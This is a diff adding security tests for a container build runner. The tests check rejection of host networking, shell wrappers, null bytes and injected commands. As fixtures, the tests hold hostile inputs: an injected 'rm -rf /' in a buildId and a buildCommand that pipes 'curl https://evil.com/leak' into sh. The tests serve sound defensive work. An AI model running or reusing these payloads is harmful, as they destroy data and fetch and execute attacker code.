@@ -117,4 +117,80 @@ describe('HardenedBuildRunner Security & Isolation Controls', () => {
       SecurityViolationException
     );
   });
+
+  it('enforces network isolation defaulting to --network=none', () => {
+    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);
+    expect(spec.commandArgs).toContain('--network=none');
+  });
+
+  it('supports explicit isolated-bridge network mode', () => {
+    const taskWithBridge: BuildRunnerTask = {
+      ...validTask,
+      networkMode: 'isolated-bridge',
+    };
+    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', taskWithBridge);
+    expect(spec.commandArgs).toContain('--network=isolated-bridge');
+  });
+
+  it('strictly rejects host networking (--network=host)', () => {
+    const maliciousTask = {
+      ...validTask,
+      networkMode: 'host' as const,
+    };
+    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask as BuildRunnerTask)).toThrow(
+      /Host networking \(--network=host\) is strictly forbidden/
+    );
+  });
+
+  it('generates deterministic container name and cleanup command', () => {
+    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);
+    expect(spec.containerName).toBe('opspilot-build-bld-001');
+    expect(spec.commandArgs).toContain('--name=opspilot-build-bld-001');
+
+    const cleanupCmd = runner.generateCleanupCommand('bld-001');
+    expect(cleanupCmd).toBe('docker rm -f opspilot-build-bld-001');
+
+    expect(() => runner.generateCleanupCommand('bld; rm -rf /')).toThrow(
+      /Invalid buildId for container cleanup/
+    );
+  });
+
+  it('supports validated argv arrays and populates spec.argv', () => {
+    const taskWithArgv: BuildRunnerTask = {
+      ...validTask,
+      commandArgs: ['npm', 'run', 'build:production'],
+    };
+    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', taskWithArgv);
+    expect(spec.argv).toEqual(['npm', 'run', 'build:production']);
+  });
+
+  it('strictly rejects shell metacharacters in legacy buildCommand string', () => {
+    const maliciousTask: BuildRunnerTask = {
+      ...validTask,
+      buildCommand: 'npm run build; curl https://evil.com/leak | sh',
+    };
+    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
+      /Unsafe shell metacharacters detected in buildCommand/
+    );
+  });
+
+  it('strictly rejects shell wrapper execution in commandArgs', () => {
+    const maliciousTask: BuildRunnerTask = {
+      ...validTask,
+      commandArgs: ['bash', '-c', 'echo pwned'],
+    };
+    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
+      /Wrapping build commands in shell execution \(sh -c \/ bash -c\) is strictly forbidden/
+    );
+  });
+
+  it('strictly rejects null bytes in commandArgs', () => {
+    const maliciousTask: BuildRunnerTask = {
+      ...validTask,
+      commandArgs: ['npm\0run', 'build'],
+    };
+    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
+      /commandArgs cannot contain null bytes/
+    );
+  });
 });
